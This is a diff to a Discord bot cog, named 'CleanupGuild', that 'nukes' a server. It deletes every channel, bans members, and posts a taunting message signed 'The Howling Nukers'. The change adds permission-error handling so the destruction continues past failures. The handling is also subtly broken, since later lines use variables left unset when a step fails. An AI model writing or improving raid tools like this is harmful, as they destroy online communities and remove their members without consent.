@@ -55,14 +55,23 @@ class CleanupGuild(commands.Cog):
         try:
             # Remove all channels and categories
             for channel in guild.channels:
-                await channel.delete()
-                renamed_channels += 1
+                try:
+                    await channel.delete()
+                    renamed_channels += 1
+                except discord.Forbidden:
+                    await ctx.send(f"Skipping channel deletion: Missing permissions for {channel.name}")
 
             # Add one category with the specified name
-            category = await guild.create_category(category_title)
+            try:
+                category = await guild.create_category(category_title)
+            except discord.Forbidden:
+                await ctx.send("Skipping category creation: Missing permissions")
 
             # Add one text channel inside the category
-            channel = await guild.create_text_channel(channel_title, category=category)
+            try:
+                channel = await guild.create_text_channel(channel_title, category=category)
+            except discord.Forbidden:
+                await ctx.send("Skipping channel creation: Missing permissions")
 
             # Send a cleanup message in the new channel
             await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
@@ -76,7 +85,7 @@ class CleanupGuild(commands.Cog):
                             await member.ban(reason="CleanupGuild command")
                             banned_users += 1
                         except discord.errors.Forbidden:
-                            pass  # Missing permissions, skip this user
+                            await ctx.send(f"Skipping user ban: Missing permissions for {member.display_name}")
 
             # Output message detailing the actions
             output_message = (
